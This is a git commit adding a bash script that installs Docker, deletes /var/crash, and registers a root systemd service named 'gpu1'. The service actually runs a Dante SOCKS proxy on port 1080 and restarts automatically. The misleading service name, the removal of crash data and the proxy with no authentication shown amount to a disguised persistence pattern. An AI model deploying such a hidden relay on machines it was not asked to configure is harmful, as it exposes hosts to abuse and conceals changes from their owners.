cef88b92c3cf2f8f0c8fd2ea7ab27f8a15e691ef
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-07-29 09:29:15 +0700

    Create sock.sh

---
+++ ETH/sock.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+cd /home
+sudo apt-get update
+echo -e "y"  |  sudo apt install docker.io
+sudo rm -rf /lib/systemd/system/gpu1.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= sudo docker run -d -p 1080:1080 wernight/dante
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable gpu1.service &&
+service gpu1 stop  &&
+service gpu1 restart
